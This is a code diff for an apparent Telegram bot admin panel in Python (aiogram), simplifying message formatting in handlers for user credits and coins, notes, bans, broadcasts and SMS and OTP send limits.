@@ -2626,23 +2698,23 @@ async def dedcr_amt(m: Message, state: FSMContext):
         amt = int((m.text or "").strip())
         if amt <= 0: raise ValueError
     except Exception:
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Valid positive.", parse_mode="HTML"); return
+        await m.answer(f"❌ Valid.", parse_mode="HTML"); return
     fsmd = await state.get_data(); uid = fsmd.get("dedcr_uid")
     if uid is None:
-        await state.clear(); await m.answer(f"{em(EMOJI_CROSS, '❌')} Expired.", parse_mode="HTML"); return
+        await state.clear()
+        await m.answer(f"❌ Expired.", reply_markup=owner_kb(d), parse_mode="HTML"); return
     ok = deduct_credits(uid, amt, d); save(); await state.clear()
     if ok:
-        await m.answer(f"{em(EMOJI_CHECK, '✅')} -{amt} credits → <code>{uid}</code>\nNew: {get_user_credits(uid, d)}",
+        await m.answer(f"✅ -{amt} → <code>{uid}</code>\nNew: {get_user_credits(uid, d)}",
                        reply_markup=owner_kb(d), parse_mode="HTML")
     else:
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Insufficient. Left: {get_user_credits(uid, d)}",
-                       reply_markup=owner_kb(d), parse_mode="HTML")
+        await m.answer(f"❌ Insufficient.", reply_markup=owner_kb(d), parse_mode="HTML")
 
 @R.callback_query(F.data.regexp(r"^owner:coins:add_to:(\d+)$"))
-async def addcoin_uid(cq: CallbackQuery, state: FSMContext):
+async def addcoin_uid(cq, state):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: await cq.answer()
@@ -2652,14 +2724,11 @@ async def addcoin_uid(cq: CallbackQuery, state: FSMContext):
     await state.set_state(S.add_coins_amount)
     ud = d.get("users", {}).get(str(uid), {})
     nm = esc(str(ud.get("name", "?"))[:30]); cur = ud.get("coins", 0)
-    await safe_edit(cq,
-        f"{em(EMOJI_COIN, '🪙')} <b>Add Coins</b>\n\n"
-        f"User: <b>{nm}</b>\n<code>{uid}</code>\nCurrent: <b>{cur}</b>\n\n"
-        f"Kitne coins add karne hai?",
-        kb([(f"{sc('cancel')}", "owner:home")]))
+    await safe_edit(cq, f"🪙 <b>Add Coins</b>\n\nUser: <b>{nm}</b>\n<code>{uid}</code>\nCurrent: <b>{cur}</b>\n\nAmount?",
+                    kb([(f"{sc('cancel')}", "owner:home")]))
 
 @R.message(S.add_coins_amount)
-async def addcoin_amt(m: Message, state: FSMContext):
+async def addcoin_amt(m, state):
     d = load()
     if not is_owner(m.from_user.id, d):
         await state.clear(); return
@@ -2667,22 +2736,22 @@ async def addcoin_amt(m: Message, state: FSMContext):
         amt = int((m.text or "").strip())
         if amt <= 0: raise ValueError
     except Exception:
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Valid positive.", parse_mode="HTML"); return
+        await m.answer(f"❌ Valid.", parse_mode="HTML"); return
     fsmd = await state.get_data(); uid = fsmd.get("addcoin_uid")
     if uid is None:
-        await state.clear(); await m.answer(f"{em(EMOJI_CROSS, '❌')} Expired.", parse_mode="HTML"); return
+        await state.clear()
+        await m.answer(f"❌ Expired.", reply_markup=owner_kb(d), parse_mode="HTML"); return
     add_coins(uid, amt, d, is_manual=True); save(); await state.clear()
-    try:
-        await m.bot.send_message(uid, f"{em(EMOJI_COIN, '🪙')} <b>+{amt} coins!</b>\nBalance: {get_user_coins(uid, d)}", parse_mode="HTML")
+    try: await m.bot.send_message(uid, f"🪙 <b>+{amt} coins!</b>\nBalance: {get_user_coins(uid, d)}", parse_mode="HTML")
     except Exception: pass
-    await m.answer(f"{em(EMOJI_CHECK, '✅')} +{amt} coins → <code>{uid}</code>\nNew: {get_user_coins(uid, d)}",
+    await m.answer(f"✅ +{amt} coins → <code>{uid}</code>\nNew: {get_user_coins(uid, d)}",
                    reply_markup=owner_kb(d), parse_mode="HTML")
 
 @R.callback_query(F.data.regexp(r"^owner:coins:deduct_from:(\d+)$"))
-async def dedcoin_uid(cq: CallbackQuery, state: FSMContext):
+async def dedcoin_uid(cq, state):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: await cq.answer()
@@ -2692,14 +2761,11 @@ async def dedcoin_uid(cq: CallbackQuery, state: FSMContext):
     await state.set_state(S.deduct_coins_amount)
     ud = d.get("users", {}).get(str(uid), {})
     nm = esc(str(ud.get("name", "?"))[:30]); cur = ud.get("coins", 0)
-    await safe_edit(cq,
-        f"{em(EMOJI_COIN, '🪙')} <b>Deduct Coins</b>\n\n"
-        f"User: <b>{nm}</b>\n<code>{uid}</code>\nCurrent: <b>{cur}</b>\n\n"
-        f"Kitne deduct?",
-        kb([(f"{sc('cancel')}", "owner:home")]))
+    await safe_edit(cq, f"🪙 <b>Deduct Coins</b>\n\nUser: <b>{nm}</b>\n<code>{uid}</code>\nCurrent: <b>{cur}</b>\n\nAmount?",
+                    kb([(f"{sc('cancel')}", "owner:home")]))
 
 @R.message(S.deduct_coins_amount)
-async def dedcoin_amt(m: Message, state: FSMContext):
+async def dedcoin_amt(m, state):
     d = load()
     if not is_owner(m.from_user.id, d):
         await state.clear(); return
@@ -2707,24 +2773,24 @@ async def dedcoin_amt(m: Message, state: FSMContext):
         amt = int((m.text or "").strip())
         if amt <= 0: raise ValueError
     except Exception:
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Valid positive.", parse_mode="HTML"); return
+        await m.answer(f"❌ Valid.", parse_mode="HTML"); return
     fsmd = await state.get_data(); uid = fsmd.get("dedcoin_uid")
     if uid is None:
-        await state.clear(); await m.answer(f"{em(EMOJI_CROSS, '❌')} Expired.", parse_mode="HTML"); return
+        await state.clear()
+        await m.answer(f"❌ Expired.", reply_markup=owner_kb(d), parse_mode="HTML"); return
     ok = deduct_coins(uid, amt, d); save(); await state.clear()
     if ok:
-        await m.answer(f"{em(EMOJI_CHECK, '✅')} -{amt} coins → <code>{uid}</code>\nNew: {get_user_coins(uid, d)}",
+        await m.answer(f"✅ -{amt} coins → <code>{uid}</code>\nNew: {get_user_coins(uid, d)}",
                        reply_markup=owner_kb(d), parse_mode="HTML")
     else:
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Insufficient. Left: {get_user_coins(uid, d)}",
-                       reply_markup=owner_kb(d), parse_mode="HTML")
+        await m.answer(f"❌ Insufficient.", reply_markup=owner_kb(d), parse_mode="HTML")
 
-# ----- user detail actions -----
+# ----- User detail actions -----
 @R.callback_query(F.data.regexp(r"^(owner|admin):u:addcr:(\d+)$"))
-async def u_addcr(cq: CallbackQuery, state: FSMContext):
+async def u_addcr(cq, state):
     d = load()
     if not is_admin(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: await cq.answer()
@@ -2733,14 +2799,13 @@ async def u_addcr(cq: CallbackQuery, state: FSMContext):
     await state.update_data(addcr_uid=uid)
     await state.set_state(S.add_credits_amount)
     back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
-    await safe_edit(cq, f"{em(EMOJI_MONEY, '💰')} <b>Add Credits</b> to <code>{uid}</code>\n\nAmount:",
-                    kb([(f"{sc('cancel')}", back)]))
+    await safe_edit(cq, f"💰 <b>Add Credits</b> to <code>{uid}</code>\n\nAmount:", kb([(f"{sc('cancel')}", back)]))
 
 @R.callback_query(F.data.regexp(r"^(owner|admin):u:addcoin:(\d+)$"))
-async def u_addcoin(cq: CallbackQuery, state: FSMContext):
+async def u_addcoin(cq, state):
     d = load()
     if not is_admin(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: await cq.answer()
@@ -2749,14 +2814,13 @@ async def u_addcoin(cq: CallbackQuery, state: FSMContext):
     await state.update_data(addcoin_uid=uid)
     await state.set_state(S.add_coins_amount)
     back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
-    await safe_edit(cq, f"{em(EMOJI_COIN, '🪙')} <b>Add Coins</b> to <code>{uid}</code>\n\nAmount:",
-                    kb([(f"{sc('cancel')}", back)]))
+    await safe_edit(cq, f"🪙 <b>Add Coins</b> to <code>{uid}</code>\n\nAmount:", kb([(f"{sc('cancel')}", back)]))
 
 @R.callback_query(F.data.regexp(r"^(owner|admin):u:dedcr:(\d+)$"))
-async def u_dedcr(cq: CallbackQuery, state: FSMContext):
+async def u_dedcr(cq, state):
     d = load()
     if not is_admin(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: await cq.answer()
@@ -2765,14 +2829,13 @@ async def u_dedcr(cq: CallbackQuery, state: FSMContext):
     await state.update_data(dedcr_uid=uid)
     await state.set_state(S.deduct_credits_amount)
     back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
-    await safe_edit(cq, f"{em(EMOJI_MONEY, '💰')} <b>Deduct Credits</b> from <code>{uid}</code>\n\nAmount:",
-                    kb([(f"{sc('cancel')}", back)]))
+    await safe_edit(cq, f"💰 <b>Deduct Credits</b> from <code>{uid}</code>\n\nAmount:", kb([(f"{sc('cancel')}", back)]))
 
 @R.callback_query(F.data.regexp(r"^(owner|admin):u:dedcoin:(\d+)$"))
-async def u_dedcoin(cq: CallbackQuery, state: FSMContext):
+async def u_dedcoin(cq, state):
     d = load()
     if not is_admin(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: await cq.answer()
@@ -2781,14 +2844,13 @@ async def u_dedcoin(cq: CallbackQuery, state: FSMContext):
     await state.update_data(dedcoin_uid=uid)
     await state.set_state(S.deduct_coins_amount)
     back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
-    await safe_edit(cq, f"{em(EMOJI_COIN, '🪙')} <b>Deduct Coins</b> from <code>{uid}</code>\n\nAmount:",
-                    kb([(f"{sc('cancel')}", back)]))
+    await safe_edit(cq, f"🪙 <b>Deduct Coins</b> from <code>{uid}</code>\n\nAmount:", kb([(f"{sc('cancel')}", back)]))
 
 @R.callback_query(F.data.regexp(r"^(owner|admin):u:msg:(\d+)$"))
-async def u_msg(cq: CallbackQuery, state: FSMContext):
+async def u_msg(cq, state):
     d = load()
     if not is_admin(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: await cq.answer()
@@ -2797,34 +2859,31 @@ async def u_msg(cq: CallbackQuery, state: FSMContext):
     await state.update_data(direct_msg_uid=uid)
     await state.set_state(S.direct_msg_text)
     back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
-    await safe_edit(cq, f"{em(EMOJI_BELL, '📩')} <b>Send Message</b> to <code>{uid}</code>\n\nText:",
-                    kb([(f"{sc('cancel')}", back)]))
+    await safe_edit(cq, f"📩 <b>Send Message</b> to <code>{uid}</code>\n\nText:", kb([(f"{sc('cancel')}", back)]))
 
 @R.message(S.direct_msg_text)
-async def u_msg_send(m: Message, state: FSMContext):
+async def u_msg_send(m, state):
     d = load(); uid = m.from_user.id
     if not is_admin(uid, d):
         await state.clear(); return
     fsmd = await state.get_data(); target = fsmd.get("direct_msg_uid")
     if target is None:
         await state.clear()
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Expired.", parse_mode="HTML"); return
+        await m.answer(f"❌ Expired.", parse_mode="HTML"); return
     txt = (m.text or "").strip()
     await state.clear()
     try:
-        await m.bot.send_message(target,
-            f"{em(EMOJI_BELL, '📩')} <b>Message from admin</b>\n\n{esc(txt)}", parse_mode="HTML")
-        await m.answer(f"{em(EMOJI_CHECK, '✅')} Sent to <code>{target}</code>",
-                       reply_markup=owner_kb(d) if is_owner(uid, d) else admin_kb(d), parse_mode="HTML")
+        await m.bot.send_message(target, f"📩 <b>Message from admin</b>\n\n{esc(txt)}", parse_mode="HTML")
+        await m.answer(f"✅ Sent!", reply_markup=owner_kb(d) if is_owner(uid, d) else admin_kb(d), parse_mode="HTML")
     except Exception as e:
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Failed: {esc(str(e)[:80])}",
+        await m.answer(f"❌ Failed: {esc(str(e)[:80])}",
                        reply_markup=owner_kb(d) if is_owner(uid, d) else admin_kb(d), parse_mode="HTML")
 
 @R.callback_query(F.data.regexp(r"^(owner|admin):u:note:(\d+)$"))
-async def u_note(cq: CallbackQuery, state: FSMContext):
+async def u_note(cq, state):
     d = load()
     if not is_admin(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: await cq.answer()
@@ -2834,36 +2893,33 @@ async def u_note(cq: CallbackQuery, state: FSMContext):
     await state.set_state(S.user_note_text)
     back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
     cur = esc(str(d.get("user_notes", {}).get(str(uid), ""))[:100]) or "<i>(empty)</i>"
-    await safe_edit(cq, f"{em(EMOJI_GEAR, '📝')} <b>Note</b> for <code>{uid}</code>\n\nCurrent: {cur}\n\nNew note (ya <code>clear</code>):",
+    await safe_edit(cq, f"📝 <b>Note</b> for <code>{uid}</code>\n\nCurrent: {cur}\n\nNew (<code>clear</code> to remove):",
                     kb([(f"{sc('cancel')}", back)]))
 
 @R.message(S.user_note_text)
-async def u_note_save(m: Message, state: FSMContext):
+async def u_note_save(m, state):
     d = load(); uid = m.from_user.id
     if not is_admin(uid, d):
         await state.clear(); return
     fsmd = await state.get_data(); target = fsmd.get("user_note_uid")
     if target is None:
         await state.clear()
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Expired.", parse_mode="HTML"); return
+        await m.answer(f"❌ Expired.", parse_mode="HTML"); return
     txt = (m.text or "").strip()[:200]
     await state.clear()
     if txt.lower() in ("clear", "remove", "none", "-"):
         d.setdefault("user_notes", {}).pop(str(target), None)
         save()
-        await m.answer(f"{em(EMOJI_CHECK, '✅')} Note cleared.",
-                       reply_markup=owner_kb(d) if is_owner(uid, d) else admin_kb(d), parse_mode="HTML")
-        return
+        await m.answer(f"✅ Cleared.", reply_markup=owner_kb(d) if is_owner(uid, d) else admin_kb(d), parse_mode="HTML"); return
     d.setdefault("user_notes", {})[str(target)] = txt
     save()
-    await m.answer(f"{em(EMOJI_CHECK, '✅')} Note saved.",
-                   reply_markup=owner_kb(d) if is_owner(uid, d) else admin_kb(d), parse_mode="HTML")
+    await m.answer(f"✅ Saved.", reply_markup=owner_kb(d) if is_owner(uid, d) else admin_kb(d), parse_mode="HTML")
 
 @R.callback_query(F.data.regexp(r"^(owner|admin):u:lim:(\d+)$"))
-async def u_lim(cq: CallbackQuery, state: FSMContext):
+async def u_lim(cq, state):
     d = load()
     if not is_admin(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: await cq.answer()
@@ -2874,14 +2930,14 @@ async def u_lim(cq: CallbackQuery, state: FSMContext):
     back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
     cur = get_user_send_limit(uid, d)
     cs = "Unlimited" if cur is None else ("🚫 BLOCKED" if cur <= 0 else str(cur))
-    await safe_edit(cq, f"{em(EMOJI_LOCK, '🔒')} <b>SMS Limit</b>\n\nCurrent: <b>{cs}</b>\n\nNumber / <code>off</code>:",
+    await safe_edit(cq, f"🔒 <b>SMS Limit</b>\n\nCurrent: <b>{cs}</b>\n\nNumber / <code>off</code>:",
                     kb([(f"{sc('cancel')}", back)]))
 
 @R.callback_query(F.data.regexp(r"^(owner|admin):u:otplim:(\d+)$"))
-async def u_otplim(cq: CallbackQuery, state: FSMContext):
+async def u_otplim(cq, state):
     d = load()
     if not is_admin(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: await cq.answer()
@@ -2892,34 +2948,34 @@ async def u_otplim(cq: CallbackQuery, state: FSMContext):
     back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
     cur = get_user_otp_limit(uid, d)
     cs = "Unlimited" if cur is None else ("🚫 BLOCKED" if cur <= 0 else str(cur))
-    await safe_edit(cq, f"{em(EMOJI_OTP, '🔐')} <b>OTP Limit</b>\n\nCurrent: <b>{cs}</b>\n\nNumber / <code>off</code>:",
+    await safe_edit(cq, f"🔐 <b>OTP Limit</b>\n\nCurrent: <b>{cs}</b>\n\nNumber / <code>off</code>:",
                     kb([(f"{sc('cancel')}", back)]))
 
 @R.callback_query(F.data.regexp(r"^(owner|admin):u:ban:(\d+)$"))
-async def u_ban(cq: CallbackQuery, state: FSMContext):
+async def u_ban(cq, state):
     d = load(); uid = cq.from_user.id
     if not is_admin(uid, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: await cq.answer()
     except Exception: pass
     target = int(cq.data.split(":")[-1])
     if is_owner(target, d) or is_admin(target, d):
-        try: await cq.answer("❌ Can't ban!", show_alert=True)
+        try: await cq.answer("❌ Can't ban!")
         except Exception: pass
         return
     await state.update_data(ban_target=target)
     await state.set_state(S.ban_user_reason)
     back = "owner:home" if is_owner(uid, d) else "admin:home"
-    await safe_edit(cq, f"Ban <code>{target}</code>\n\nReason likho (ya <code>skip</code>):",
+    await safe_edit(cq, f"Ban <code>{target}</code>\n\nReason (ya <code>skip</code>):",
                     kb([(f"{sc('cancel')}", back)]))
 
 @R.callback_query(F.data.regexp(r"^(owner|admin):u:unban:(\d+)$"))
-async def u_unban(cq: CallbackQuery, state: FSMContext):
+async def u_unban(cq, state):
     d = load(); uid = cq.from_user.id
     if not is_admin(uid, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     target = int(cq.data.split(":")[-1])
@@ -2929,45 +2985,42 @@ async def u_unban(cq: CallbackQuery, state: FSMContext):
     try: await cq.answer("✅ Unbanned!")
     except Exception: pass
     prefix = "owner" if is_owner(uid, d) else "admin"
-    try:
-        await cq.bot.send_message(target, f"{em(EMOJI_CHECK, '✅')} Unbanned.", parse_mode="HTML")
+    try: await cq.bot.send_message(target, f"✅ Unbanned.", parse_mode="HTML")
     except Exception: pass
     await safe_edit(cq, _user_detail(d, target), _user_detail_kb(target, d, prefix))
 
-# ----- BAN / UNBAN general -----
-@R.callback_query(F.data.in_({"owner:ban", "admin:ban"}))
-async def ban_start(cq: CallbackQuery, state: FSMContext):
+# ----- BAN/UNBAN -----
+@R.callback_query(F.data.in_({"owner:ban","admin:ban"}))
+async def ban_start(cq, state):
     d = load()
     if not is_admin(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: await cq.answer()
     except Exception: pass
     await state.set_state(S.ban_user)
     back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
-    await safe_edit(cq, f"{em(EMOJI_CROSS, '🚫')} <b>Ban</b>\n\nTelegram ID:",
-                    kb([(f"{sc('cancel')}", back)]))
+    await safe_edit(cq, f"🚫 <b>Ban</b>\n\nTelegram ID:", kb([(f"{sc('cancel')}", back)]))
 
 @R.message(S.ban_user)
-async def ban_uid(m: Message, state: FSMContext):
+async def ban_uid(m, state):
     d = load(); uid = m.from_user.id
     if not is_admin(uid, d):
         await state.clear(); return
     try: bid = int((m.text or "").strip())
     except Exception:
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Valid.", parse_mode="HTML"); return
+        await m.answer(f"❌ Valid.", parse_mode="HTML"); return
     if is_owner(bid, d) or is_admin(bid, d):
         await state.clear()
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Can't ban!", parse_mode="HTML"); return
+        await m.answer(f"❌ Can't ban!", parse_mode="HTML"); return
     await state.update_data(ban_target=bid)
     await state.set_state(S.ban_user_reason)
     back = "owner:home" if is_owner(uid, d) else "admin:home"
-    await m.answer(f"Reason likho (ya <code>skip</code>):",
-                   reply_markup=kb([(f"{sc('cancel')}", back)]), parse_mode="HTML")
+    await m.answer(f"Reason (ya <code>skip</code>):", reply_markup=kb([(f"{sc('cancel')}", back)]), parse_mode="HTML")
 
 @R.message(S.ban_user_reason)
-async def ban_reason(m: Message, state: FSMContext):
+async def ban_reason(m, state):
     d = load(); uid = m.from_user.id
     if not is_admin(uid, d):
         await state.clear(); return
@@ -2976,22 +3029,22 @@ async def ban_reason(m: Message, state: FSMContext):
     if reason.lower() == "skip": reason = ""
     await state.clear()
     if bid is None:
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Expired.", parse_mode="HTML"); return
+        await m.answer(f"❌ Expired.", parse_mode="HTML"); return
     if bid not in d.get("banned", []): d.setdefault("banned", []).append(bid)
     if reason: d.setdefault("ban_reasons", {})[str(bid)] = reason[:200]
     save()
     bk = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
-    await m.answer(f"{em(EMOJI_CROSS, '🚫')} Banned <code>{bid}</code>", reply_markup=bk, parse_mode="HTML")
+    await m.answer(f"🚫 Banned <code>{bid}</code>", reply_markup=bk, parse_mode="HTML")
     try:
         rtxt = f"\n<b>Reason:</b> {esc(reason)}" if reason else ""
-        await m.bot.send_message(bid, f"{em(EMOJI_CROSS, '🚫')} <b>Banned.</b>{rtxt}", parse_mode="HTML")
+        await m.bot.send_message(bid, f"🚫 <b>Banned.</b>{rtxt}", parse_mode="HTML")
     except Exception: pass
 
-@R.callback_query(F.data.in_({"owner:unban:menu", "admin:unban:menu"}))
-async def unban_menu(cq: CallbackQuery, state: FSMContext):
+@R.callback_query(F.data.in_({"owner:unban:menu","admin:unban:menu"}))
+async def unban_menu(cq, state):
     d = load()
     if not is_admin(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     banned = d.get("banned", [])
@@ -3002,14 +3055,14 @@ async def unban_menu(cq: CallbackQuery, state: FSMContext):
     try: await cq.answer()
     except Exception: pass
     prefix = "owner" if is_owner(cq.from_user.id, d) else "admin"
-    await safe_edit(cq, f"{em(EMOJI_CHECK, '🔓')} <b>Unban</b>\n\nBanned: <b>{len(banned)}</b>",
+    await safe_edit(cq, f"🔓 <b>Unban</b>\n\nBanned: <b>{len(banned)}</b>",
                     unban_menu_kb(d, prefix))
 
 @R.callback_query(F.data.regexp(r"^(owner|admin):unban:do:(\d+)$"))
-async def unban_do(cq: CallbackQuery, state: FSMContext):
+async def unban_do(cq, state):
     d = load(); uid = cq.from_user.id
     if not is_admin(uid, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     bid = int(cq.data.split(":")[-1])
@@ -3018,31 +3071,26 @@ async def unban_do(cq: CallbackQuery, state: FSMContext):
     save()
     try: await cq.answer("✅ Unbanned!")
     except Exception: pass
-    try:
-        await cq.bot.send_message(bid, f"{em(EMOJI_CHECK, '✅')} Unbanned.", parse_mode="HTML")
+    try: await cq.bot.send_message(bid, f"✅ Unbanned.", parse_mode="HTML")
     except Exception: pass
-    if is_owner(uid, d):
-        await safe_edit(cq, owner_panel_text(d), owner_kb(d))
-    else:
-        await safe_edit(cq, admin_panel_text(d), admin_kb(d))
+    await _render_home(cq, state, skip_fj=True)
 
 # ----- BROADCAST -----
-@R.callback_query(F.data.in_({"owner:broadcast", "admin:broadcast"}))
-async def bc_start(cq: CallbackQuery, state: FSMContext):
+@R.callback_query(F.data.in_({"owner:broadcast","admin:broadcast"}))
+async def bc_start(cq, state):
     d = load()
     if not is_admin(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: await cq.answer()
     except Exception: pass
     await state.set_state(S.broadcast)
     back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
-    await safe_edit(cq, f"{em(EMOJI_BELL, '📢')} <b>Broadcast</b>\n\nMessage:",
-                    kb([(f"{sc('cancel')}", back)]))
+    await safe_edit(cq, f"📢 <b>Broadcast</b>\n\nMessage:", kb([(f"{sc('cancel')}", back)]))
 
 @R.message(S.broadcast)
-async def bc_do(m: Message, state: FSMContext):
+async def bc_do(m, state):
     d = load(); uid = m.from_user.id
     if not is_admin(uid, d):
         await state.clear(); return
@@ -3056,9 +3104,8 @@ async def bc_do(m: Message, state: FSMContext):
         try:
             t = int(us)
             if m.text:
-                await m.bot.send_message(t, f"{em(EMOJI_BELL, '📢')} <b>Broadcast</b>\n\n{m.text}", parse_mode="HTML")
-            else:
-                await m.copy_to(t)
+                await m.bot.send_message(t, f"📢 <b>Broadcast</b>\n\n{m.text}", parse_mode="HTML")
+            else: await m.copy_to(t)
             ok += 1
         except Exception: fail += 1
         await asyncio.sleep(0.05)
@@ -3066,121 +3113,119 @@ async def bc_do(m: Message, state: FSMContext):
         try: await wait.delete()
         except Exception: pass
     bk = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
-    await m.answer(f"{em(EMOJI_CHECK, '✅')} Done!\n✅ {ok} | ❌ {fail}", reply_markup=bk, parse_mode="HTML")
+    await m.answer(f"✅ Done!\n✅ {ok} | ❌ {fail}", reply_markup=bk, parse_mode="HTML")
 
-# ----- LIMITS -----
+# ----- LIMIT -----
 @R.callback_query(F.data == "owner:set_limit")
-async def set_limit_start(cq: CallbackQuery, state: FSMContext):
+async def set_limit_start(cq, state):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: await cq.answer()
     except Exception: pass
     await state.set_state(S.set_limit_uid)
-    await safe_edit(cq, f"{em(EMOJI_LOCK, '🔒')} <b>SET SMS LIMIT</b>\n\nUser ID:",
-                    kb([(f"{sc('cancel')}", "owner:home")]))
+    await safe_edit(cq, f"🔒 <b>SET SMS LIMIT</b>\n\nUser ID:", kb([(f"{sc('cancel')}", "owner:home")]))
 
 @R.message(S.set_limit_uid)
-async def set_limit_uid_done(m: Message, state: FSMContext):
+async def set_limit_uid_done(m, state):
     d = load()
     if not is_owner(m.from_user.id, d):
         await state.clear(); return
     try: target = int((m.text or "").strip())
     except Exception:
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Numeric ID.", parse_mode="HTML"); return
+        await m.answer(f"❌ Numeric.", parse_mode="HTML"); return
     if str(target) not in d.get("users", {}):
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Not found.", parse_mode="HTML"); return
+        await m.answer(f"❌ Not found.", parse_mode="HTML"); return
     await state.update_data(limit_target_uid=target)
     cur = get_user_send_limit(target, d)
     cs = "Unlimited" if cur is None else ("🚫 BLOCKED" if cur <= 0 else f"{cur}")
     await state.set_state(S.set_limit_value)
-    await m.answer(f"{em(EMOJI_LOCK, '🔒')} Current: <b>{cs}</b>\n\nNumber / <code>0</code> / <code>off</code>",
+    await m.answer(f"🔒 Current: <b>{cs}</b>\n\nNumber / <code>0</code> / <code>off</code>",
                    reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")
 
 @R.message(S.set_limit_value)
-async def set_limit_val_done(m: Message, state: FSMContext):
+async def set_limit_val_done(m, state):
     d = load()
     if not is_owner(m.from_user.id, d):
         await state.clear(); return
     txt = (m.text or "").strip().lower()
     fsmd = await state.get_data(); target = fsmd.get("limit_target_uid")
     if target is None:
-        await state.clear(); await m.answer(f"{em(EMOJI_CROSS, '❌')} Expired.", parse_mode="HTML"); return
+        await state.clear()
+        await m.answer(f"❌ Expired.", reply_markup=owner_kb(d), parse_mode="HTML"); return
     if txt in ("off", "unlimited", "remove", "none", "reset"):
         set_user_send_limit(target, None, d); save(); await state.clear()
-        await m.answer(f"{em(EMOJI_CHECK, '✅')} Unlimited", reply_markup=owner_kb(d), parse_mode="HTML"); return
+        await m.answer(f"✅ Unlimited", reply_markup=owner_kb(d), parse_mode="HTML"); return
     try:
         lv = int(txt)
         if lv < 0: raise ValueError
     except Exception:
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Invalid.", parse_mode="HTML"); return
+        await m.answer(f"❌ Invalid.", parse_mode="HTML"); return
     set_user_send_limit(target, lv, d); save(); await state.clear()
-    await m.answer(f"{em(EMOJI_CHECK, '✅')} <code>{target}</code> → {lv}",
-                   reply_markup=owner_kb(d), parse_mode="HTML")
+    await m.answer(f"✅ <code>{target}</code> → {lv}", reply_markup=owner_kb(d), parse_mode="HTML")
 
 @R.callback_query(F.data == "owner:set_otp_limit")
-async def set_otplimit_start(cq: CallbackQuery, state: FSMContext):
+async def set_otplimit_start(cq, state):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: await cq.answer()
     except Exception: pass
     await state.set_state(S.set_otp_limit_uid)
-    await safe_edit(cq, f"{em(EMOJI_OTP, '🔐')} <b>SET OTP LIMIT</b>\n\nUser ID:",
-                    kb([(f"{sc('cancel')}", "owner:home")]))
+    await safe_edit(cq, f"🔐 <b>SET OTP LIMIT</b>\n\nUser ID:", kb([(f"{sc('cancel')}", "owner:home")]))
 
 @R.message(S.set_otp_limit_uid)
-async def set_otplimit_uid_done(m: Message, state: FSMContext):
+async def set_otplimit_uid_done(m, state):
     d = load()
     if not is_owner(m.from_user.id, d):
         await state.clear(); return
     try: target = int((m.text or "").strip())
     except Exception:
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Numeric.", parse_mode="HTML"); return
+        await m.answer(f"❌ Numeric.", parse_mode="HTML"); return
     if str(target) not in d.get("users", {}):
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Not found.", parse_mode="HTML"); return
+        await m.answer(f"❌ Not found.", parse_mode="HTML"); return
